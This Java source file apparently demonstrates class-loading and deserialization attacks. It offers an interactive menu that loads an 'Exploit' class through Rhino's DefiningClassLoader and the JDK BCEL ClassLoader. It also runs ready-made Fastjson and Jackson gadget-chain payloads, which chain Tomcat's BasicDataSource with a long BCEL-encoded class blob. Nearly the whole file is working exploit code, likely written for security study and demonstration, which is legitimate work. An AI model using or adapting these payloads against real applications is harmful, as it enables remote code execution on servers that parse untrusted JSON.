package classloader.proj;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Scanner;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.mozilla.javascript.DefiningClassLoader;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

public class MainTest {

	private static String readClass(String cls) {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		try {
			IOUtils.copy(new FileInputStream(new File(cls)), bos);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return Base64.encodeBase64String(bos.toByteArray());
	}

	private static String getEvilClassPath() {
		return System.getProperty("user.dir") + "/target/classes/classloader/proj/Exploit.class";
	}

	// use mozilla (js-1.7R2.jar) DefiningClassLoader to load byte string of class,
	// which encoded by base64
	private static void mozilla_definingClassLoader() throws Exception {
		String evilCode = readClass(getEvilClassPath());

		// rhino js : org.mozilla.javascript.DefiningClassLoader
		DefiningClassLoader dcl = new DefiningClassLoader();
		Class<?> c = dcl.defineClass("classloader.proj.Exploit", Base64.decodeBase64(evilCode));
		c.newInstance();
	}

	// use jdk bcel ClassLoader to load soecial encoded class name of byte string of
	// class
	private static void bcel_definingClassLoader() throws Exception {
		// jdk rt.jar: com.sun.org.apache.bcel.internal.util.ClassLoader
		String encodedClassName = "$$BCEL$$" + BcelEncode.encode(getEvilClassPath());
		System.out.println(encodedClassName);
		Class.forName(encodedClassName, true, new ClassLoader());
	}

	private static void fastjson_deserialize() throws Exception {
		String poc = "{\n" 
				+ "    {\n" 
				+ "        \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" 
				+ "        \"d\":\n"
				+ "        {\n" 
				+ "            \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"
				+ "            \"driverClassLoader\":\n" 
				+ "            {\n"
				+ "                \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\",\n"
				+ "            },\n" 
				+ "            \"driverClassName\":\n"
				+ "                \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSmO$d3P$U$7e$ee$d6$d1$aet$M$86$9b$M$f1$F_$b7$a1$d4$f77$Y$c4$QL$8cS$88$p$u$f1$d3$5dw3$ef$ec$da$a6$bd3$f8$8b$fc$8c$l$d0$98$e8$P$f0G$ZO$cb$80$n$b3$c9$ed$cdyz$ce$f3$3c$e7$dc$db$df$7f$7e$fc$Cp$l$ab$sr$b8$9c$c5$V$5c5p$cd$c4u$dc0QAUG$cd$c0$82$81$9bqtK$c7$a2$J$T$b6$8e$db$3a$ee0$8c$zKO$aa$V$86t$a5$ba$cd$a0$ad$f9m$c1$90oHO$bc$ee$f7Z$o$dc$e2$z$97$90B$c3w$b8$bb$cdC$Z$c7$DPS$ld$c40$dbp$5c$kE$ae$cf$db$o$b4$83$d0$ef$da$eb$bb$81$ebK$b5$c4$60$ae$ef$3a$oP$d2$f7$o$jw$a9$a6$c7$a5$c7P$aa$bcot$f9$tn$bb$dc$eb$d8M$VJ$af$b3$948$e0a$878$a7G$7cf0$96$jw$e0$97$91$7e$f1$mG$fa$f6$8b$8d$p$ZJ$cb5$Vw$3e$be$e2A$e2$93Z$s$hM$bf$l$3a$e2$b9$8c$7d$5b$D$7b$8bq$b9$85$J$e4u$dc$b3h$86$P$a8$f5z$bd$3e$f8$y$da$f3$f5$ba$8e$87$W$k$e1$b1$8e$t$W$9e$82$d8$t$ff5F$a6$fd$40PSs$f6$b3$mp$a5$c3$93v$ed5$ee$3a$7d$97$x$3f$5c$e4A$60a$Zujl$84e$L$x$c83$cc$fco$8c$t47Z$5d$e1$a8C$a2$E$3a$o$3ai$ees$a4D$8fN$d6$ef$ab$e1Ym$92gE$ce$F$ef$z$N$f9$Z$82$Z$f4$m$8e$5c$o$yVF$9f$d3$d41$fa$a6$ef$v$d9$a3$b9$9a$j$a1$8e$82b$a5$da8$95C$82$9a$d8$V$OCe$e4$F$Y$826C$df$RQD$V$f9$e0$c0$g$9d$e9V$c8$j$81yXt$d7$e3$t$N$W$l$lR$98$a4h$95vF$7b$ae$f6$N$ec$xR$85$f4$3e$b4$3d$CR$98$a2$f7$E$a5$83$925J$b6$I$vPd$j$U$60$ggh$_$d2$d2$I$v$n$8b$b3$98$Z$d0$$$d0$8a$b3$d81$d5X$C$U$87$u$Y$ca$98$3dAa$e0$i$89$b1$84$a2$87L$92u$e1$3b2$99$9f$Y$dbI$X$f4$e6$8eV0$9a$fb$c8$be$fd$C$e3em$l$e3$7b$D$d6$Z$faC$d3$89N$89$ea$40f$8a$a4$S$a3e$8c$e3$3c$d9$3d$d4$z$93$d6$i$n$c4LKG$ea$9d$8e$8b$b1$fc$a5$c4$ea$fc_$807$fc$bd$k$E$A$A\"\n"
				+ "        }\n" 
				+ "    }:\"ddd\"\n" 
				+ "}";
		System.out.println(poc);
		Object json = JSON.parse(poc);
		System.out.println(json.toString());
	}

	private static void jackson_deserialize() throws Exception {
		String poc = "\n[\n" 
	            + "  \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" 
				+ "  {\n"
				+ "    \"driverClassLoader\" :\n" 
				+ "      {\n"
				+ "        \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" 
				+ "      },\n"
				+ "    \"driverClassName\" : \n"
				+ "        \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuSmO$d3P$U$7e$ee$d6$d1$aet$M$86$9b$M$f1$F_$b7$a1$d4$f77$Y$c4$QL$8cS$88$p$u$f1$d3$5dw3$ef$ec$da$a6$bd3$f8$8b$fc$8c$l$d0$98$e8$P$f0G$ZO$cb$80$n$b3$c9$ed$cdyz$ce$f3$3c$e7$dc$db$df$7f$7e$fc$Cp$l$ab$sr$b8$9c$c5$V$5c5p$cd$c4u$dc0QAUG$cd$c0$82$81$9bqtK$c7$a2$J$T$b6$8e$db$3a$ee0$8c$zKO$aa$V$86t$a5$ba$cd$a0$ad$f9m$c1$90oHO$bc$ee$f7Z$o$dc$e2$z$97$90B$c3w$b8$bb$cdC$Z$c7$DPS$ld$c40$dbp$5c$kE$ae$cf$db$o$b4$83$d0$ef$da$eb$bb$81$ebK$b5$c4$60$ae$ef$3a$oP$d2$f7$o$jw$a9$a6$c7$a5$c7P$aa$bcot$f9$tn$bb$dc$eb$d8M$VJ$af$b3$948$e0a$878$a7G$7cf0$96$jw$e0$97$91$7e$f1$mG$fa$f6$8b$8d$p$ZJ$cb5$Vw$3e$be$e2A$e2$93Z$s$hM$bf$l$3a$e2$b9$8c$7d$5b$D$7b$8bq$b9$85$J$e4u$dc$b3h$86$P$a8$f5z$bd$3e$f8$y$da$f3$f5$ba$8e$87$W$k$e1$b1$8e$t$W$9e$82$d8$t$ff5F$a6$fd$40PSs$f6$b3$mp$a5$c3$93v$ed5$ee$3a$7d$97$x$3f$5c$e4A$60a$Zujl$84e$L$x$c83$cc$fco$8c$t47Z$5d$e1$a8C$a2$E$3a$o$3ai$ees$a4D$8fN$d6$ef$ab$e1Ym$92gE$ce$F$ef$z$N$f9$Z$82$Z$f4$m$8e$5c$o$yVF$9f$d3$d41$fa$a6$ef$v$d9$a3$b9$9a$j$a1$8e$82b$a5$da8$95C$82$9a$d8$V$OCe$e4$F$Y$826C$df$RQD$V$f9$e0$c0$g$9d$e9V$c8$j$81yXt$d7$e3$t$N$W$l$lR$98$a4h$95vF$7b$ae$f6$N$ec$xR$85$f4$3e$b4$3d$CR$98$a2$f7$E$a5$83$925J$b6$I$vPd$j$U$60$ggh$_$d2$d2$I$v$n$8b$b3$98$Z$d0$$$d0$8a$b3$d81$d5X$C$U$87$u$Y$ca$98$3dAa$e0$i$89$b1$84$a2$87L$92u$e1$3b2$99$9f$Y$dbI$X$f4$e6$8eV0$9a$fb$c8$be$fd$C$e3em$l$e3$7b$D$d6$Z$faC$d3$89N$89$ea$40f$8a$a4$S$a3e$8c$e3$3c$d9$3d$d4$z$93$d6$i$n$c4LKG$ea$9d$8e$8b$b1$fc$a5$c4$ea$fc_$807$fc$bd$k$E$A$A\",\n"
				+ "    \"logWriter\":\n" 
				+ "      [\n" 
				+ "        \"java.io.PrintWriter\",\n" 
				+ "          {\n"
				+ "              \"file\":\"/tmp/123\"\n" 
				+ "          }\n" 
				+ "      ]\n" 
				+ "  }\n" 
				+ "]";
		System.out.println(poc);
		ObjectMapper om = new ObjectMapper();
		om.enableDefaultTyping();
		om.readValue(poc.getBytes(), Object.class);

	}

	public static void main(String[] args) throws Exception {
		Scanner sc = new Scanner(System.in);

		while (true) {
			System.out.println("" + "[1]: mozilla\n" + "[2]: bcel\n" + "[3]: fastjson\n" + "[4]: jackson\n"
					+ "Your Choice is [0-4]: \n");
			String choice = sc.nextLine();
			try {
				switch (choice) {
				case "1":
					mozilla_definingClassLoader();
					break;
				case "2":
					bcel_definingClassLoader();
					break;
				case "3":
					fastjson_deserialize();
					break;
				case "4":
					jackson_deserialize();
					break;
				case "0":
				case "q":
				default:
					System.out.println("FInished.");
					sc.close();
					return;
				}
			} catch (Exception e) {

			}
		}

	}

}
